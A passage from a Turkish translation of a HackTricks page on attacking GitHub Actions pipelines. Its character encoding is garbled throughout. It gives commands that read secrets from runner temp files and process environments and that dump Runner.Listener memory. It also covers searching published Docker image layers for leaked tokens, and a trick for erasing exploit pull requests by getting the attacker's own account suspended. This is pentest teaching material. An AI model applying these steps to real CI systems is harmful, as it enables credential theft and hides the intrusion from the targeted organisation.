secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* EÄŸer gizli bilgi **bir ifadede doÄŸrudan kullanÄ±lÄ±yorsa**, oluÅŸturulan shell scripti **diskte** saklanÄ±r ve eriÅŸilebilir.
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScript eylemleri iÃ§in gizli bilgiler ortam deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir.
* ```bash
ps axe | grep node
```
*   **Ã–zel bir eylem** iÃ§in, risk, programÄ±n **argÃ¼mandan** elde ettiÄŸi gizli bilgiyi nasÄ±l kullandÄ±ÄŸÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Kendinden BarÄ±ndÄ±rÄ±lan Ã‡alÄ±ÅŸtÄ±rÄ±cÄ±larÄ± KÃ¶tÃ¼ye Kullanma

**Github Actions'Ä±n hangi non-github altyapÄ±sÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ±** bulmanÄ±n yolu, Github Action yapÄ±landÄ±rma yaml'Ä±nda **`runs-on: self-hosted`** aramaktÄ±r.

**Kendinden barÄ±ndÄ±rÄ±lan** Ã§alÄ±ÅŸtÄ±rÄ±cÄ±lar, **ekstra hassas bilgilere**, diÄŸer **aÄŸ sistemlerine** (aÄŸda savunmasÄ±z uÃ§ noktalar mÄ±? meta veri servisi?) eriÅŸim saÄŸlayabilir veya, izolasyon altÄ±nda ve yok edilse bile, **birden fazla eylem aynÄ± anda Ã§alÄ±ÅŸtÄ±rÄ±labilir** ve kÃ¶tÃ¼ niyetli olanÄ± diÄŸerinin **gizli bilgilerini Ã§alabilir**.

Kendinden barÄ±ndÄ±rÄ±lan Ã§alÄ±ÅŸtÄ±rÄ±cÄ±larda, herhangi bir adÄ±mda iÅŸ akÄ±ÅŸlarÄ±nÄ±n tÃ¼m gizli bilgilerini iÃ§erecek olan **\_Runner.Listener**\_\*\* sÃ¼recinden gizli bilgileri elde etmek de mÃ¼mkÃ¼ndÃ¼r; bu, belleÄŸini dÃ¶kerek yapÄ±labilir:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi iÃ§in [**bu gÃ¶nderiyi kontrol edin**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker GÃ¶rÃ¼ntÃ¼leri KaydÄ±

Github iÃ§inde **bir Docker gÃ¶rÃ¼ntÃ¼sÃ¼ oluÅŸturup depolayacak Github eylemleri** yapmak mÃ¼mkÃ¼ndÃ¼r.\
AÅŸaÄŸÄ±daki geniÅŸletilebilir Ã¶rnekte bulunabilir:

<details>

<summary>Github Eylemi OluÅŸtur &#x26; Docker GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ YÃ¼kle</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Ã–nceki kodda gÃ¶rebileceÄŸiniz gibi, Github kayÄ±t defteri **`ghcr.io`** Ã¼zerinde barÄ±ndÄ±rÄ±lmaktadÄ±r.

Repo Ã¼zerinde okuma izinlerine sahip bir kullanÄ±cÄ±, kiÅŸisel eriÅŸim belirteci kullanarak Docker GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Sonra, kullanÄ±cÄ± **Docker imaj katmanlarÄ±nda sÄ±zdÄ±rÄ±lmÄ±ÅŸ gizli bilgileri** arayabilir:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions gÃ¼nlÃ¼klerinde hassas bilgiler

**Github** gizli deÄŸerleri **tespit etmeye** ve **gÃ¶stermemeye** Ã§alÄ±ÅŸsa da, eylemin yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda Ã¼retilmiÅŸ olabilecek **diÄŸer hassas veriler** gizlenmeyecektir. Ã–rneÄŸin, bir gizli deÄŸerle imzalanmÄ±ÅŸ bir JWT, [Ã¶zellikle yapÄ±landÄ±rÄ±lmadÄ±kÃ§a](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizlenmeyecektir.

## Ä°zlerinizi Kapatma

([**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) teknik) Ã–ncelikle, oluÅŸturulan herhangi bir PR, Github'da ve hedef GitHub hesabÄ±nda kamuya aÃ§Ä±k olarak gÃ¶rÃ¼nÃ¼r. GitHub'da varsayÄ±lan olarak, **internetin PR'sini silemeyiz**, ancak bir twist var. Github tarafÄ±ndan **askÄ±ya alÄ±nan** hesaplar iÃ§in, tÃ¼m **PR'lar otomatik olarak silinir** ve internetten kaldÄ±rÄ±lÄ±r. Bu nedenle, etkinliÄŸinizi gizlemek iÃ§in ya **GitHub hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± saÄŸlamalÄ± ya da hesabÄ±nÄ±zÄ±n iÅŸaretlenmesini** saÄŸlamalÄ±sÄ±nÄ±z. Bu, **tÃ¼m etkinliklerinizi** GitHub'dan internetten gizleyecektir (temelde tÃ¼m istismar PR'larÄ±nÄ±zÄ± kaldÄ±rÄ±r).

GitHub'daki bir organizasyon, hesaplarÄ± GitHub'a bildirmede Ã§ok proaktiftir. Tek yapmanÄ±z gereken, Issue'da "biraz ÅŸey" paylaÅŸmak ve 12 saat iÃ§inde hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± saÄŸlamak :p ve iÅŸte, istismarÄ±nÄ±zÄ± GitHub'da gÃ¶rÃ¼nmez hale getirdiniz.

{% hint style="warning" %}
Bir organizasyonun hedef alÄ±ndÄ±klarÄ±nÄ± anlamanÄ±n tek yolu, GitHub gÃ¼nlÃ¼klerini SIEM'den kontrol etmektir; Ã§Ã¼nkÃ¼ GitHub UI'dan PR kaldÄ±rÄ±lacaktÄ±r.
{% endhint %}

## AraÃ§lar

AÅŸaÄŸÄ±daki araÃ§lar, Github Action iÅŸ akÄ±ÅŸlarÄ±nÄ± bulmak ve hatta savunmasÄ±z olanlarÄ± bulmak iÃ§in faydalÄ±dÄ±r:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
